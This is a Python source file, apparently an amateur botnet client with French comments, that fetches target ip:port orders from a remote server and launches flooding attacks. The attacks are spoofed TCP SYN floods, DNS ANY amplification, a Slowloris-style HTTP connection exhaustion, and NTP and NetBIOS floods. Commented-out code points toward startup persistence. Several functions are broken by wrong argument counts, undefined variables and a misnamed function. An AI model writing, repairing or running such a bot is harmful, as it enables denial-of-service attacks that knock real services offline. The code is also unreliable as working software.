"""
==================================================
 C&C DDOS By KyaEH, Getwod, Luks, Neowi, 3RW4NFR
 V0.0.2
 Repo: https://github.com/kyaEH/C-CDDOS/
==================================================
"""

from datetime import datetime
from scapy.all import *
import urllib.request,os,sys,time,socket,random#,getpass
#import winreg as reg 
#from pathlib import Path

"""
def checkOS():
	if sys.platform.startswith("win"):
		WinStartup()

	if sys.platform.startswith("linux"):
		print("linux")


def winStartup(): 
	USER_NAME = getpass.getuser()
"""
	#bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME

def checkTime():
	now = datetime.now()
	current_time = now.strftime("%M")

	if current_time.endswith("0") or current_time.endswith("5"):
		return True
	else:
		timeremaining=current_time
		timeremaining=int("".join(timeremaining[1]))
		if timeremaining>5:
			timeremaining-=5
		print("Temps restant: {} min".format(5-timeremaining))
		return True 			#return false, true pour tester
	

def waiting():
	while 1:
		if checkTime():
			askOrder()
			time.sleep(10)
	
		else: 
			print("En attente du temps en cours...")
			time.sleep(1)


def askOrder():
	print("C'est l'heure!\nVerification de la cible sur le serveur...")
	page = urllib.request.urlopen('https://iproc.fr/C&CDDOS/' )
	ipport= str(page.read()).replace("b",'').replace("'",'')  			# On format le résultat de b'ip:port' à ip:port
	cible = ipport.split(':')
	if len(cible) != 2:
		print('Erreur, cible incorrect: "{}"\nNouvel essai dans 10 secondes'.format(ipport))

	else:
		cible[1] = int(cible[1])

		if cible[1]==21	:
			tcpFlood(cible[0])

		if cible[1]==53: 													
			dnsFlood(cible[0])

		if cible[1]==80 or cible[1]==8080 or cible[1]==443:
			httpFlood(cible[0],cible[1])

		if cible[1]==123:
			ntpFlood(cible[0],cible[1])

		if cible[1]==137:
			netbiosFlood(cible[0])

		if cible[1]==404:
			partieBastien(cible[0])

		else:
			print('Erreur, cible incorrect: "{}"\nNouvel essai dans 1 minute'.format(ipport))


def tcpFlood(cible):
	ip = IP(src=RandIP("192.168.1.1/24"), dst=cible)
	# forge a TCP SYN packet 
	tcp = TCP(sport=RandShort(), dport=21, flags="S")
	# flooding data
	raw = Raw(b"\n\r\n\r\n\r\n\r"*4096)
	# stack up the layers
	p = ip / tcp / raw
	send(p, loop=1, verbose=0)

def dnsFlood(ip, port):
	hostname = socket.gethostname()
	target = socket.gethostbyname(hostname)
	nameserver = ip
	domain = ""

	ip = IP(src=target, dst=nameserver)
	udp = UDP(dport=port)
	dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain,qtype=255))

	request = (ip/udp/dns)

	send(request,loop=1)


def httpFlood(cible,port):
	list_of_sockets = []

	regular_headers = [
		"User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		"Accept-language: en-US,en,q=0.5",
		"Connection: keep-alive"
	]

	socket_count = 100
	print("Attaque sur {}:{} avec {} packets".format(cible,port,socket_count))

	print("Creation des sockets...")			#On créer 100 sockets différentes pour créer des connexions différentes
	for i in range(socket_count):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(4)
			s.connect((cible, port))
		except socket.error:
			break
		list_of_sockets.append(s)
	print("Parametrage des sockets...")
	for i in list_of_sockets:
		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))			#b'Sending: GET /?randint HTTP/1.1\r\n'  -> \r\n est la norme pour faire un retour à la ligne
		for header in regular_headers:
			s.send(bytes("{}\r\n".format(header).encode("utf-8")))			#Header user agent + Accept-language 			

	while True:
		print("Envoie des en-têtes keep-alive (persistantes) ...")
		for i in list_of_sockets:
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))			#b'sending: X-a: 439\r\n'	-> X- signifie en-tête non standart https://docs.oracle.com/en-us/iaas/Content/Balance/Reference/httpheaders.htm  
			except socket.error:
				print("error")
				raise

		time.sleep(15)

def ntpFlood(cible, source):
	hostname = socket.gethostname()
	target = socket.gethostbyname(hostname)
	nameserver = ip
	domain=""

	pkt = IP(dsc=target, src=nameserver)/UDP(sport=random.randint(1000, 65535),dport=port)/Raw(load=data)
	send(pkt,loop=1)

def netbiosFlood(cible):
	ip = IP(src=RandIP("192.168.1.1/24"), dst=addr)
	# forge a UDP packet 
	udp = UDP(sport=RandShort(), dport=137)
	# flooding data
	raw = Raw(b"\n\r\n\r\n\r\n\r"*4096)
	p = ip / udp / raw
	send(p, loop=1, verbose=0)

def partiebastien(cible):
	print("NTP Flood sur {}".format(cible))

if __name__=="__main__": 
	#checkOS()
	try:
		waiting()

	except KeyboardInterrupt:
		print('Interrupted')
		try:
			sys.exit(0)
		except SystemExit:
			os._exit(0)
